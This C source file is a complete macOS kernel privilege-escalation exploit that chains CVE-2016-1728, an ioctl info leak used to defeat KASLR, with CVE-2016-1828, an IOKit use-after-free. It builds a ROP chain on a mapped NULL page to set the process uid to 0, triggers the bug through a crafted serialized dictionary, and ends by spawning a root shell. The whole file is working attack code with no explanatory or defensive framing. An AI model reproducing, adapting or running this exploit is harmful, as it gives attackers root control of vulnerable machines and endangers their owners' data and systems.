//
//  main.c
//  CVE-2016-1728 info leak
//  CVE-2016-1828 uaf
//  Created by wooy0ung on 2018/12/27.
//

#include <stdio.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include "librop/librop.h"


char buffer[IFNAMSIZ];

struct if_clonereq ifcr = {
    .ifcr_count = 1,
    .ifcr_buffer = buffer,
};

static uint64_t kernel_slide=0;


static int
is_kernel_pointer(uint64_t addr) {
	return (0xffffff7f00000000 <= addr && addr < 0xffffff8100000000);
}

static int
is_kernel_slide(uint64_t slide) {
	return ((slide & ~0x000000007fe00000) != 0);
}

int get_kaslr() {
    uint64_t leak;
    int sockfd = socket(AF_INET,SOCK_STREAM,0);
    int err = ioctl(sockfd,SIOCIFGCLONERS,&ifcr);
    printf("\r\n[>] Leak kernel_slide\n");
    leak = *(uint64_t *)(buffer+8);
    if (!is_kernel_pointer(leak)) {
		printf("\t[-] error: leak 0x%016llx\n", leak);
		return -1;
	}
    kernel_slide = *(uint64_t *)(buffer+8) - 0xffffff800033487f;    // dev 0xffffff80002ef3af
    if (is_kernel_slide(kernel_slide)) {
        printf("\t[-] error: kernel_slide 0x%016llx\n", kernel_slide);
		return -1;
	}
    printf("\t[+] kernel_slide: 0x%016llx\n",kernel_slide);
    return 0;
}

int build_rop() {
	macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK);
	SET_KERNEL_SLIDE(kernel_slide);

    // Gadget
    uint64_t xchg_esp_eax_pop_rsp, xchg_rax_rdi, set_svuid_0;
    xchg_esp_eax_pop_rsp = XCHG_ESP_EAX_POP_RSP_INS(map);
    xchg_rax_rdi = XCHG_RAX_RDI_INS(map);
    set_svuid_0 = SET_SVUID_0_INS(map);
    printf("\r\n[>] Find gadgets\n");
    printf("\t[+] XCHG_ESP_EAX_POP_RSP_INS: 0x%016llx\n",xchg_esp_eax_pop_rsp);
    printf("\t[+] XCHG_RAX_RDI_INS: 0x%016llx\n",xchg_rax_rdi);
    printf("\t[+] SET_SVUID_0_INS: 0x%016llx\n",set_svuid_0);

    // Symbol
    uint64_t current_proc, proc_ucred, posix_cred_get, thread_exception_return;
    current_proc = SLIDE_POINTER(find_symbol_address(map, "_current_proc"));
    proc_ucred = SLIDE_POINTER(find_symbol_address(map, "_proc_ucred"));
    posix_cred_get = SLIDE_POINTER(find_symbol_address(map, "_posix_cred_get"));
    thread_exception_return = SLIDE_POINTER(find_symbol_address(map, "_thread_exception_return"));
    printf("\r\n[>] Find symbols\n");
    printf("\t[+] _current_proc: 0x%016llx\n",current_proc);
    printf("\t[+] _proc_ucred: 0x%016llx\n",proc_ucred);
    printf("\t[+] _posix_cred_get: 0x%016llx\n",posix_cred_get);
    printf("\t[+] _thread_exception_return: 0x%016llx\n",thread_exception_return);

    vm_address_t payload_addr = 0;
	size_t size = 0x1000;
	// In case we are re-executing, deallocate the NULL page.
	vm_deallocate(mach_task_self(), payload_addr, size);
	kern_return_t kr = vm_allocate(mach_task_self(), &payload_addr, size, 0);
	if (kr != KERN_SUCCESS) {
		printf("\t[-] error: could not allocate NULL page for payload\n");
		return -1;
	}
    uint64_t * vtable = (uint64_t *)payload_addr;
	uint64_t * rop_stack = ((uint64_t *)(payload_addr + size)) - 8;
	// Virtual method 4 is called in the kernel with rax set to 0.
	vtable[0] = (uint64_t)rop_stack;        //  *0 = rop_stack                  
	vtable[4] = xchg_esp_eax_pop_rsp;       //  rsp = 0; rsp = *rsp; start rop  
	rop_stack[0] = current_proc;            //  rax = &proc                     
	rop_stack[1] = xchg_rax_rdi;            //  rdi = &proc                     
	rop_stack[2] = proc_ucred;              //  rax = &cred                     
	rop_stack[3] = xchg_rax_rdi;            //  rdi = &cred                     
	rop_stack[4] = posix_cred_get;          //  rax = &posix_cred               
	rop_stack[5] = xchg_rax_rdi;            //  rdi = &posix_cred               
	rop_stack[6] = set_svuid_0;             //  we are now setuid 0             
	rop_stack[7] = thread_exception_return; //  stop rop     

	return 0;                   
}

int exec_rop() {
    printf("\r\n[>] Execute rop\n");
	uint32_t data[] = {
		0x000000d3,                         //     magic                            
		0x81000010,                         //  0: OSDictionary                      
		0x08000002, 0x00000061,             //  1: key "a"                           
		0x04000020, 0x00000000, 0x00000000, //  2: 1[2: OSNumber]                    
		0x08000002, 0x00000062,             //  3: key "b"                           
		0x04000020, 0x00000000, 0x00000000, //  4: 2[4: OSNumber]                    
		0x0c000001,                         //  5: key "a"                           
		0x0b000001,                         //  6: true ; heap freelist: 1[2:]       
		0x0c000003,                         //  7: key "b"                           
		0x0b000001,                         //  8: true ; heap freelist: 2[4:] 1[2:] 
		0x0c000001,                         //  9: key "a"                           
		0x0a000028,                         // 10: 2[10,4: OSData] => 1[2: contents] 
		0x00000000, 0x00000000,             //     vtable ptr                        
		0x00000000, 0x00000000, 0x00000000, 0x00000000,
	    0x00000000, 0x00000000, 0x00000000, 0x00000000,
		0x0c000001,                         // 11: key "b"                           
		0x8c000002,                         // 12: 1[2: contents]->retain()          
	};
	mach_port_t master_port, iterator;
	kern_return_t kr = IOMasterPort(MACH_PORT_NULL, &master_port);
	if (kr != KERN_SUCCESS) {
		return -1;
	}
	kr = io_service_get_matching_services_bin(master_port, (char *)data, sizeof(data), &iterator);
	seteuid(0);
	setuid(0);
	setgid(0);
	if (kr == KERN_SUCCESS) {
		IOObjectRelease(iterator);
	}
	if (getuid() != 0) {
		return -1;
	}
    return 0;
}

int main(int argc, char * argv[]) {
	int err;
	sync();

    err = get_kaslr();
    if(err){
        printf("[-] error: get_kaslr\n");
        return -1;
    }

    err = build_rop();
    if(err){
        printf("[-] error: build_rop\n");
        return -1;
    }

    err = exec_rop();
    if(err){
        printf("[-] error: exec_rop\n");
        return -1;
    }

    argv[0] = "/bin/sh";
	execve(argv[0], argv, NULL);	

    return 0;
}